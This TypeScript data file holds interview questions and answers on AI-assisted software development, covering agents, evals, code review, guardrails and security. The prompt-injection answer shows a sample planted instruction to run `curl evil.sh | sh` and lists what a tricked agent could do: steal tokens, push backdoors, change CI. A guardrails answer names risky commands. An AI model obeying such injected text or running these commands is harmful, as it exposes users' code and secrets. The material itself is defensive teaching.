import type { QuestionSet } from './types'

export const aiSdlc: QuestionSet = {
  id: 'ai-sdlc',
  title: 'AI in the SDLC',
  questions: [
    {
      id: 'what-is-ai-sdlc',
      q: 'What does an AI-assisted SDLC mean to you?',
      a: `It means using AI tools across the **whole** software lifecycle, not only for autocomplete: turning requirements into specs, exploring designs, writing code and tests, reviewing pull requests, writing docs and helping operate production.

What does **not** change: engineers still own the outcome. The work shifts from typing code toward **specifying** what you want, **giving context**, and **verifying** what comes back.

A mature setup has:
- clear specs and tests the AI works against
- repo context files and conventions agents can read
- the same quality gates for AI code as for human code (review, CI, security scans)
- guardrails on what agents may touch
- metrics that show whether it actually helps

A good one-liner: ==AI speeds up the loop, humans own the judgement==.`,
      difficulty: 'Easy',
      freq: 3,
      tags: ['fundamentals', 'process'],
      followUp: 'Where in the lifecycle has AI helped your team the most?',
    },
    {
      id: 'ai-per-phase',
      q: 'How can AI help in each phase of the SDLC?',
      a: `- **Requirements:** turn meeting notes or tickets into user stories and acceptance criteria; ask the model to list ambiguities and edge cases.
- **Design:** compare architecture options, draft an ADR or API contract, generate diagrams (Mermaid), poke holes in a design.
- **Code:** autocomplete, generate boilerplate, multi-file changes by agents, refactors and migrations, explain unfamiliar code.
- **Test:** generate unit and edge-case tests, test data, E2E scripts; find untested paths.
- **Review:** AI first-pass review in CI for bugs, security and style before a human reviews.
- **Deploy:** write and debug CI/CD configs, Dockerfiles and IaC, draft release notes.
- **Operate:** summarise logs and alerts, suggest likely root causes during incidents, draft postmortems, triage bug reports.

In every phase the AI produces a ==draft for a human to verify==; the value is speed, not unchecked autonomy.`,
      difficulty: 'Medium',
      freq: 3,
      tags: ['process', 'lifecycle'],
    },
    {
      id: 'copilot-vs-agent',
      q: 'What is the difference between a coding copilot and a coding agent?',
      a: `A **copilot** suggests while you drive: inline completions, chat that answers questions, edits you accept line by line (classic GitHub Copilot, Cursor Tab). You stay in control of every change.

A **coding agent** takes a task and works on it: reads the codebase, plans, edits many files, runs commands and tests, fixes failures, and can open a pull request. Examples: **Claude Code** (terminal, IDE and cloud), **Cursor** agent mode, **GitHub Copilot coding agent** (assigned an issue, works in the background, opens a PR), OpenAI Codex.

Trade-offs:
- agents handle larger tasks but need **clear specs, good tests and guardrails**
- review effort moves from typing to ==reviewing whole diffs==
- copilots are better for small edits and learning code in the flow

Most teams use both: copilot for flow, agents for well-defined tickets, refactors and chores.`,
      difficulty: 'Easy',
      freq: 3,
      tags: ['tools', 'agents', 'copilot'],
      followUp: 'Which kinds of tickets would you hand to a background agent?',
    },
    {
      id: 'agent-context-files',
      q: 'How do you give a coding agent the right context about your repo?',
      a: `Agents start every session knowing nothing about your project, so make the context explicit and versioned.

- **Context files:** \`CLAUDE.md\` (Claude Code) or \`AGENTS.md\` (a cross-tool convention), also Cursor rules and Copilot instructions. Include: how to build, test and lint; project structure; conventions; things to never do. Keep them short and specific, and update them when the agent repeats a mistake.
- **Specs and tickets** with acceptance criteria, not one-line requests.
- **Tests** as an executable definition of done the agent can run itself.
- **Examples:** point to an existing file that shows the pattern to follow.
- **Tools:** MCP servers for docs, the issue tracker or the database schema.

Less is more: a bloated context file gets ignored. Treat it ==like code==: reviewed, committed and kept current.`,
      difficulty: 'Medium',
      freq: 3,
      tags: ['agents', 'context', 'claude-md'],
      code: { lang: 'markdown', code: `# CLAUDE.md

## Commands
- npm run dev / npm test / npm run lint (run tests before finishing)

## Conventions
- TypeScript strict, no any. Server code lives in src/server.
- Use the db helper in src/server/db.ts, never raw SQL strings.

## Never
- Edit migrations that already ran. Commit .env files.` },
    },
    {
      id: 'spec-driven-development',
      q: 'What is spec-driven development with AI?',
      a: `**Spec-driven development** means writing a clear specification **before** asking an agent to code, then treating the spec as the source of truth. Tools like GitHub Spec Kit and Kiro formalise it, but a Markdown file works.

A typical flow:
- **Spec:** the problem, user stories, acceptance criteria, constraints, out-of-scope items
- **Plan:** the agent proposes a technical design and a task list; a human reviews and edits it
- **Tasks:** the agent implements one small task at a time, with tests
- **Verify:** tests and review against the acceptance criteria

Why it works: vague prompts produce ==plausible but wrong code==. A spec forces you to decide the hard questions up front, gives the agent a stable reference across long sessions, and gives reviewers something to check against. It is the opposite of "vibe coding", which is fine for prototypes but not for production.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['specs', 'process', 'agents'],
      followUp: 'How detailed should a spec be before you hand it to an agent?',
    },
    {
      id: 'reviewing-ai-code',
      q: 'How do you review AI-generated code?',
      a: `With the **same bar as human code**, plus extra attention to the ways AI fails. The author who opens the PR owns it, even if an agent wrote every line.

What to check:
- **Does it solve the actual problem?** AI often solves a nearby, easier one.
- **Hallucinations:** APIs, options or packages that do not exist; outdated library usage.
- **Edge cases and errors:** null handling, empty inputs, concurrency, swallowed exceptions.
- **Security:** injection, missing auth checks, secrets, unsafe defaults.
- **Tests that really test:** not mocked into meaninglessness or edited to pass.
- **Fit:** duplicated helpers instead of reusing existing ones, unnecessary abstractions, style drift.
- **Size:** ask for smaller PRs; giant AI diffs hide bugs.

Run it, read it, and be able to ==explain every line== before approving.`,
      difficulty: 'Medium',
      freq: 3,
      tags: ['code review', 'quality'],
      followUp: 'What do you do when an AI PR is 2,000 lines?',
    },
    {
      id: 'tdd-with-ai',
      q: 'How does TDD work with an AI coding agent?',
      a: `TDD fits agents very well, because tests give the agent an **objective target** and a feedback loop it can run on its own.

A flow that works:
- you (or the agent, reviewed by you) write **failing tests** that capture the behaviour, including edge cases
- confirm they fail for the right reason, and commit them
- ask the agent to make them pass **without changing the tests**
- the agent iterates: run, read failures, fix, rerun
- review the implementation, then refactor with the tests green

Why it helps: the tests encode intent that a prompt cannot, they stop the agent declaring success early, and they protect against regressions in later AI edits. Watch for the classic failure: an agent that ==edits or deletes the test== to make it pass, or special-cases the test inputs. Say so explicitly in the instructions and check the diff.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['tdd', 'testing', 'agents'],
      followUp: 'How do you stop an agent from weakening tests to make them pass?',
    },
    {
      id: 'ai-test-generation-pitfalls',
      q: 'What are the pitfalls of AI-generated tests?',
      a: `- **Testing the implementation, not the requirement:** the AI reads the code and asserts whatever it currently does, bugs included. The test passes but proves nothing.
- **Tautological tests:** mocking the very function under test, or asserting a mock returned what it was told to return.
- **Happy path only:** missing empty, null, boundary, error and concurrency cases.
- **Coverage theatre:** high line coverage with weak assertions such as \`toBeDefined()\`.
- **Brittle tests:** snapshotting everything or asserting on implementation details.
- **Flaky tests:** real time, randomness or network.

Fixes: describe the behaviour and edge cases in the prompt, generate tests ==from the spec== rather than the code, review assertions first, and use mutation testing (Stryker) to check that tests actually fail when the code is wrong.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['testing', 'quality'],
      code: { lang: 'javascript', run: true, code: `// Bug: discount should apply only to orders over 100
const price = (total) => (total > 50 ? total * 0.9 : total)

// AI test written from the code: asserts the buggy behaviour
console.log('ai test passes:', price(60) === 54)

// Test written from the spec catches it
console.log('spec test passes:', price(60) === 60)` },
    },
    {
      id: 'ai-code-review-ci',
      q: 'How would you add AI code review to CI?',
      a: `Run an AI reviewer on every pull request as a **first pass**, before a human looks.

Setup:
- a CI job (GitHub Actions) on \`pull_request\` that sends the diff plus relevant context to a model, or uses a ready-made integration (Claude Code GitHub Action, Copilot code review, CodeRabbit)
- a review prompt or repo instructions covering what matters: bugs, security, missing tests, team conventions
- results posted as inline PR comments

Make it useful, not noisy:
- ask for **high-confidence findings only**, ranked by severity
- tune with feedback; track how many comments get accepted
- give the job **least privilege**: read code, write comments, no secrets it does not need, no merging
- be careful with PRs from forks: the diff is ==untrusted input== and can contain prompt injection

It complements, not replaces, human review and deterministic tools like linters and SAST.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['ci', 'code review', 'automation'],
      code: { lang: 'yaml', code: `on: pull_request
permissions:
  contents: read
  pull-requests: write
jobs:
  ai-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: anthropics/claude-code-action@v1
        with:
          anthropic_api_key: \${{ secrets.ANTHROPIC_API_KEY }}
          prompt: Review this PR for bugs and security issues only.` },
    },
    {
      id: 'security-risks',
      q: 'What are the main security risks of AI coding tools?',
      a: `- **Insecure suggestions:** SQL injection, missing authorisation, weak crypto, permissive CORS. Models learned from plenty of insecure code.
- **Secrets leakage:** pasting keys into prompts, agents reading \`.env\` files, generated code with hard-coded credentials.
- **Hallucinated packages / slopsquatting:** the AI suggests a package that does not exist; attackers register that name with malware.
- **Prompt injection via repo content:** instructions hidden in a README, issue, code comment, dependency or web page that an agent reads and obeys.
- **Over-privileged agents:** an agent with shell, network and production credentials can do real damage when tricked or wrong.
- **Data exposure:** proprietary code sent to tools without proper data agreements.

Mitigations: SAST and secret scanning in CI, dependency allowlists and lockfiles, sandboxed agents with ==least privilege==, approval for risky commands, and security-focused review of AI code.`,
      difficulty: 'Hard',
      freq: 3,
      tags: ['security', 'supply chain'],
      followUp: 'How would you stop an agent from exfiltrating secrets?',
    },
    {
      id: 'slopsquatting',
      q: 'What is slopsquatting and how do you protect against it?',
      a: `LLMs sometimes invent plausible package names (\`fast-json-sanitize\`, \`requests-oauth2-helper\`). Research found a meaningful share of AI-suggested packages did not exist, and the same fake names repeat across runs. **Slopsquatting** is attackers registering those hallucinated names on npm or PyPI with malicious install scripts, waiting for someone (or an agent) to run \`npm install\`.

Defences:
- **verify before installing:** check the package exists, its age, downloads, maintainers and repo
- **allowlists / internal registry proxies** (Artifactory, Verdaccio) so only approved packages resolve
- **lockfiles** and \`npm ci\` in CI; review any new dependency in PRs
- disable install scripts where possible (\`--ignore-scripts\`)
- supply-chain scanners (Socket, Snyk, Dependabot)
- tell agents in their context file that ==new dependencies need approval==`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['security', 'supply chain', 'dependencies'],
      code: { lang: 'javascript', run: true, code: `const approved = new Set(['zod', 'express', 'react', 'pg'])

function checkDeps(suggested) {
  for (const name of suggested) {
    console.log(name, approved.has(name) ? 'ok' : 'NEEDS REVIEW')
  }
}

// an agent wants to add these
checkDeps(['zod', 'express-auth-helperz', 'pg'])` },
    },
    {
      id: 'prompt-injection-repo',
      q: 'How can prompt injection attack a coding agent through repository content?',
      a: `A coding agent reads lots of text it did not write: READMEs, issues, PR descriptions, code comments, docs fetched from the web, dependency source, test output. Any of it can contain instructions such as "also run \`curl evil.sh | sh\`" or "add this URL to the config", hidden in a comment or invisible Unicode.

If the agent has shell access, network access and secrets, a successful injection can:
- exfiltrate tokens or source code
- push malicious changes or backdoors
- modify CI workflows to persist

Defences:
- run agents in a **sandbox** (container or VM, no production credentials)
- **network allowlists** so data cannot leave to arbitrary hosts
- **permission prompts** for shell commands, file writes outside the repo, pushes
- treat issues and PRs from outsiders as ==untrusted input==, especially in CI
- review the full diff, including config and workflow files`,
      difficulty: 'Hard',
      freq: 2,
      tags: ['security', 'prompt injection', 'agents'],
    },
    {
      id: 'licensing-ip-privacy',
      q: 'What licensing, IP and privacy concerns come with AI coding tools?',
      a: `**Licensing / IP:**
- generated code can occasionally reproduce licensed code (GPL snippets in a proprietary product). Many tools offer **duplicate detection** filters; enable them.
- ownership and copyrightability of purely AI-generated code is still unsettled in some jurisdictions; companies set policies and enterprise vendors offer IP indemnity.

**Privacy and confidentiality:**
- prompts can include proprietary code, customer data or secrets. Use **enterprise plans** with no training on your data, clear retention terms and SSO.
- never paste production PII into prompts; use synthetic or masked data.
- check regulations that apply (GDPR, HIPAA, the EU AI Act) and where data is processed.

**Governance:** an approved-tools list, a written usage policy, audit logs, and ==clear accountability==: the engineer who merges the code is responsible for it, whoever wrote it.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['legal', 'privacy', 'governance'],
    },
    {
      id: 'llmops-lifecycle',
      q: 'Describe the LLMOps lifecycle for shipping an AI feature.',
      a: `LLM features need their own lifecycle because behaviour lives in **prompts, models and data**, not only code.

- **Design:** define the task, success metrics and failure modes; build a golden eval set early.
- **Develop:** iterate on prompts, retrieval and tools against evals, not vibes.
- **Version everything:** prompts in Git (or a prompt registry) alongside code, with the exact model id and parameters.
- **Eval in CI:** every prompt or model change runs the eval suite; regressions block the merge.
- **Release safely:** feature flags, **shadow** traffic, **canary** to a small percentage, then ramp.
- **Monitor:** quality (user feedback, online LLM-judge sampling), latency, errors, refusals, **cost per request**, and **drift** as inputs change.
- **Improve:** add production failures to the eval set, repeat.

The core idea: ==evals are the tests== of an AI feature.`,
      difficulty: 'Hard',
      freq: 3,
      tags: ['llmops', 'evals', 'deployment'],
      followUp: 'A provider releases a new model version. How do you migrate safely?',
    },
    {
      id: 'eval-gate-ci',
      q: 'How do you run evals in CI to catch prompt regressions?',
      a: `Treat a prompt change like a code change with tests.

- keep a **golden dataset** in the repo: inputs plus expected outputs or rubrics
- a CI job runs the current prompt and model over the dataset (in parallel, often with the Batch API to save cost)
- graders score each case: deterministic checks first, an LLM judge for open-ended quality
- compare to the **baseline** from main: overall score and per-category scores
- **fail the build** if the score drops below a threshold or a critical case breaks
- post a summary on the PR, with the failing examples

Practical notes: LLM output varies, so use enough cases and allow a small tolerance instead of expecting identical text. Keep a fast smoke set for every PR and a ==full suite nightly== or before release. Tools: Promptfoo, Braintrust, LangSmith, or a plain test runner.`,
      difficulty: 'Hard',
      freq: 2,
      tags: ['evals', 'ci', 'llmops'],
      code: { lang: 'javascript', run: true, code: `const baseline = { accuracy: 0.92, critical: 1.0 }
const results = [
  { id: 'refund', pass: true, critical: true },
  { id: 'crash', pass: true, critical: true },
  { id: 'greeting', pass: false, critical: false },
  { id: 'pricing', pass: true, critical: false },
]

const acc = results.filter((r) => r.pass).length / results.length
const critOk = results.filter((r) => r.critical).every((r) => r.pass)
console.log('accuracy', acc, 'baseline', baseline.accuracy)

const tolerance = 0.03
const ok = critOk && acc >= baseline.accuracy - tolerance
console.log(ok ? 'PASS' : 'FAIL: regression, blocking merge')` },
    },
    {
      id: 'llm-observability',
      q: 'What should you log and monitor in an LLM application?',
      a: `Use **traces**: one trace per user request, with a span for each step (retrieval, each model call, each tool call). For each model call record:
- model id, prompt version, parameters such as \`effort\`
- **input, output and cached tokens**, and the computed cost
- latency: time to first token and total
- stop reason (finished, hit max tokens, tool use, refusal), errors and retries
- the inputs and outputs themselves, with PII redacted and access controlled

Dashboards and alerts: p95 latency, error and 429 rate, cost per request and per user, cache hit rate, quality signals (thumbs down, judge scores on sampled traffic).

Tooling: OpenTelemetry with the GenAI semantic conventions, or LLM-specific platforms (Langfuse, LangSmith, Helicone, Datadog LLM Observability). Traces are also how you ==debug a bad answer==: you can see exactly what context the model had.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['observability', 'monitoring', 'llmops'],
      followUp: 'How do you log prompts and outputs without leaking PII?',
    },
    {
      id: 'retry-rate-limits',
      q: 'How do you handle rate limits (429) and transient errors from an LLM API?',
      a: `LLM APIs limit requests and tokens per minute, and they return **429** (rate limited) or **5xx / 529** (overloaded) under load.

- **Retry with exponential backoff and jitter:** wait 1s, 2s, 4s... plus randomness, so many clients do not retry in sync. Respect the \`retry-after\` header when present.
- **Cap retries** and the total wait; then fail gracefully or fall back to another model.
- **Do not retry** 400-level errors such as bad requests or auth failures; they will not fix themselves.
- **Smooth traffic:** a queue with a concurrency limit, and the Batch API for bulk jobs.
- Make retried operations **idempotent** when tools have side effects.

The official SDKs already retry some errors (configurable with \`maxRetries\`), but you should know how to ==write it yourself==.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['reliability', 'rate limits', 'errors'],
      code: { lang: 'javascript', run: true, code: `const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

async function withRetry(fn, retries = 4, baseMs = 10) {
  for (let attempt = 0; ; attempt++) {
    try {
      return await fn()
    } catch (err) {
      const retryable = err.status === 429 || err.status >= 500
      if (!retryable || attempt >= retries) throw err
      const wait = baseMs * 2 ** attempt + Math.random() * baseMs
      console.log('attempt', attempt + 1, 'got', err.status, 'retrying')
      await sleep(wait)
    }
  }
}

let calls = 0
const flaky = async () => {
  if (++calls < 3) throw Object.assign(new Error('rate'), { status: 429 })
  return 'ok after ' + calls + ' calls'
}
console.log(await withRetry(flaky))` },
    },
    {
      id: 'human-in-the-loop',
      q: 'Where do you put humans in the loop for AI agents and features?',
      a: `Match the level of human control to the **risk and reversibility** of the action.

- **Read-only or easily reversible** (search, drafting, local edits in a branch): let the agent run.
- **Side effects** (sending email, posting comments, running migrations, spending money, deleting data, deploying): require **explicit approval**, showing exactly what will happen.
- **High-stakes decisions** (medical, legal, financial, hiring): AI suggests, a qualified human decides.

Patterns:
- permission prompts and allowlists for agent tools and commands
- draft-then-approve flows (agent opens a PR, a human merges)
- confidence thresholds: low-confidence cases go to a review queue
- sampling and auditing of automated decisions

Avoid approval fatigue: if people click "approve" 200 times a day they stop reading. Put the ==approvals where they matter== and automate the rest safely.`,
      difficulty: 'Medium',
      freq: 2,
      tags: ['safety', 'agents', 'governance'],
      followUp: 'How do you decide which agent actions need approval?',
    },
    {
      id: 'measuring-impact',
      q: 'How do you measure whether AI tools actually improve engineering productivity?',
      a: `Measure **outcomes**, not activity.

Good signals:
- **DORA metrics:** deployment frequency, lead time for changes, change failure rate, time to restore service
- **cycle time** from first commit or ticket start to production, and PR review time
- **quality:** bug escape rate, incidents, rework and reverted PRs
- **developer experience:** surveys (the SPACE framework), time spent on toil
- **adoption:** who uses which tools for what

Bad signals: **lines of code**, number of AI suggestions accepted or "percent of code written by AI". More code is not more value, and these numbers are easy to game.

Method: compare against a baseline or a pilot vs control group, watch for a few months, and look for side effects. Studies have found developers can ==feel faster while being slower== on some tasks, so do not rely on self-reports alone.`,
      difficulty: 'Medium',
      freq: 3,
      tags: ['metrics', 'dora', 'productivity'],
      followUp: 'Throughput went up but so did the change failure rate. What now?',
    },
    {
      id: 'agent-guardrails',
      q: 'What guardrails do you put around autonomous coding agents?',
      a: `Assume the agent will eventually do something wrong, by mistake or because it was tricked, and limit the blast radius.

- **Sandboxing:** run in a container, VM or cloud sandbox with no access to the host, production or personal credentials.
- **Least privilege:** scoped, short-lived tokens; read-only where possible; no production database access.
- **Permission prompts and allowlists:** auto-allow safe commands (tests, lint), ask for risky ones (\`rm -rf\`, \`git push --force\`, package installs, network calls).
- **Network egress controls** to stop exfiltration.
- **Branch protection:** agents open PRs, they never merge to main or deploy themselves; required reviews and CI checks still apply.
- **Limits:** max steps, time and spend per task.
- **Audit logs** of every command and change, and easy rollback.

The goal is ==safe autonomy==: more freedom inside the sandbox, hard walls around it.`,
      difficulty: 'Hard',
      freq: 3,
      tags: ['security', 'agents', 'guardrails'],
      followUp: 'How do you avoid prompts becoming so frequent that people just click allow?',
    },
    {
      id: 'when-not-to-use-ai',
      q: 'When should you not use AI in software development?',
      a: `- **When you cannot verify the result:** if nobody on the team can review the code or the domain (crypto, concurrency, compliance logic), AI output is a liability.
- **Safety-critical or regulated decisions** without a qualified human signing off.
- **When a deterministic solution exists:** a regex, a lookup table, a SQL query or a rules engine is cheaper, faster and testable. Do not call an LLM to add two numbers.
- **Sensitive data** that policy or contracts forbid sending to a third party.
- **Learning fundamentals:** juniors who outsource everything never build the skills to review AI code.
- **Tiny, well-known edits** where explaining the task takes longer than doing it.
- **When latency, cost or consistency budgets** cannot tolerate model variability.

Good engineers treat AI as one tool among many and ==pick it deliberately==, not by default.`,
      difficulty: 'Easy',
      freq: 2,
      tags: ['judgement', 'process'],
    },
    {
      id: 'legacy-codebase',
      q: 'How would you use AI to work on a large, unfamiliar legacy codebase?',
      a: `AI is strong at **reading** code, which is most of the work in legacy systems.

- **Explore first:** ask an agent to map the architecture, entry points and data flow, and to explain a module before you change it. Verify the claims by reading the code it cites.
- **Write characterisation tests** that pin down current behaviour before refactoring, so changes are safe.
- **Make small, incremental changes**, each in its own PR, rather than a big AI rewrite.
- **Migrations at scale:** define the transformation once, let an agent apply it file by file, and run the tests after each batch. Use codemods where a deterministic transform is possible.
- **Capture knowledge:** have the agent draft docs and a context file, then review and commit them.

The danger is ==confident wrong explanations== of old, quirky code, so always check against the source and the tests.`,
      difficulty: 'Medium',
      freq: 1,
      tags: ['legacy', 'refactoring', 'agents'],
    },
    {
      id: 'ai-incident-response',
      q: 'How can AI help during an incident or production debugging?',
      a: `AI is useful for **speed of understanding**, while humans stay in charge of actions.

- **Summarise signals:** paste or connect logs, traces and alerts and ask for a timeline and likely causes.
- **Correlate changes:** "what deployed in the last hour that touches checkout?" across commits and config.
- **Explain stack traces** and unfamiliar code paths quickly.
- **Draft queries** for logs and metrics (SQL, PromQL, Datadog) you then run and check.
- **Write the postmortem** draft from the incident channel and timeline.

Rules: give the AI **read-only** access to production data, redact secrets and PII, do not let it run remediation commands on its own, and verify every hypothesis with real data. A model will happily invent a ==plausible root cause==, so treat its output as leads, not conclusions.`,
      difficulty: 'Easy',
      freq: 1,
      tags: ['operations', 'incidents', 'debugging'],
    },
    {
      id: 'safe-model-rollout',
      q: 'How do you roll out a prompt or model change safely in production?',
      a: `A prompt or model change can break things as badly as a code change, so release it the same way.

- **Pin the model id** and version prompts; never let "latest" change behaviour silently.
- **Offline evals** on the golden set must pass before release.
- **Shadow test:** run the new version on real traffic in parallel and compare outputs without showing them to users.
- **Canary:** route a small percentage of users through a feature flag, watch quality signals, latency, cost and error rates.
- **A/B test** when you need to show business impact.
- **Ramp up** gradually, with a one-click **rollback** to the previous prompt and model.

Watch for side effects: a new model may be smarter but more verbose (more output tokens, higher cost) or format answers differently and break a parser. ==Compare cost and format==, not only accuracy.`,
      difficulty: 'Hard',
      freq: 2,
      tags: ['llmops', 'deployment', 'canary'],
      followUp: 'How do you compare two prompt versions when outputs are non-deterministic?',
    },
    {
      id: 'team-adoption',
      q: 'How would you introduce AI coding tools to an engineering team?',
      a: `- **Start with a pilot:** a few volunteers, a few months, clear goals and a baseline of current metrics.
- **Choose approved tools** with security and legal: enterprise plans, no training on your code, SSO, audit logs.
- **Write a short policy:** what data may be shared, review requirements for AI code, who is accountable.
- **Invest in context:** context files, good tests and documented conventions make every tool better.
- **Share practices:** internal demos, prompt and workflow libraries, pairing sessions.
- **Keep the quality gates:** same review, CI and security scans for all code.
- **Measure and adjust:** DORA metrics, quality and developer surveys, not lines of code.

Address concerns openly: job fears, juniors' learning and code quality. Adoption works best when engineers see it ==removing toil==, not when it is mandated with usage quotas.`,
      difficulty: 'Easy',
      freq: 1,
      tags: ['process', 'leadership', 'adoption'],
    },
  ],
}
